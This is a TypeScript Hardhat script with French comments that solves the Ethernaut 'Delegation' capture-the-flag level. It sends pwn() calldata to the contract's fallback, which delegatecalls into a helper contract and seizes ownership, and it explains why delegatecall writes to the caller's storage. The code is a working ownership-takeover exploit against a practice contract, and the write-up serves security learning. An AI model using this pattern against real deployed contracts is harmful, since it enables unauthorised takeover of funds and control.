/**
 * Resolution du challenge Ethernaut "Delegation":
 * 1) On envoie une transaction a Delegation avec le calldata de pwn().
 * 2) Delegation n'a pas pwn(), donc fallback() est appelee.
 * 3) fallback() sert d'attrape-tout: elle se declenche quand le selector ne
 *    correspond a aucune fonction exposee par le contrat.
 * 4) fallback() fait delegatecall(msg.data) vers Delegate.
 * 5) Avec delegatecall, le code de Delegate s'execute dans le contexte de
 *    Delegation: meme storage, meme address(this) logique, et msg.sender
 *    conserve l'EOA qui a initie la transaction.
 * 6) Donc Delegate.pwn() ecrit owner = msg.sender dans le storage de
 *    Delegation, ce qui change Delegation.owner.
 *
 * Important: call != delegatecall.
 * - call vers Delegate modifie seulement Delegate.owner.
 * - delegatecall depuis Delegation modifie Delegation.owner.
 *
 * Important: ne pas envoyer d'ETH ici.
 * Ce contrat n'a pas de receive() et sa fallback n'est pas payable, donc
 * msg.value > 0 revert. Il faut envoyer seulement le calldata de pwn().
 */
import { network } from "hardhat";

const DELEGATION_ADDRESS = "0x59aa91197b7f31b7c88d9d9E452F22756a248812";
const DELEGATION_ABI = ["function owner() view returns (address)"];

const { ethers } = await network.create();

// Ethernaut Delegation: call fallback with pwn() selector, don't send ETH
const [signer] = await ethers.getSigners();
if (signer === undefined) {
  throw new Error(
    "No signer available for this network. Configure PRIVATE_KEY for Sepolia.",
  );
}

const signerAddress = await signer.getAddress();
const delegation = await ethers.getContractAt(DELEGATION_ABI, DELEGATION_ADDRESS);
const ownerBefore = await delegation.owner();

const pwnInterface = new ethers.Interface(["function pwn()"]);
const tx = await signer.sendTransaction({
  to: DELEGATION_ADDRESS,
  data: pwnInterface.encodeFunctionData("pwn"),
});
await tx.wait();

const ownerAfter = await delegation.owner();

console.log("txHash:", tx.hash);
console.log("ownerBefore:", ownerBefore);
console.log("ownerAfter:", ownerAfter);
console.log(
  "delegationSolved:",
  ownerAfter.toLowerCase() === signerAddress.toLowerCase(),
);
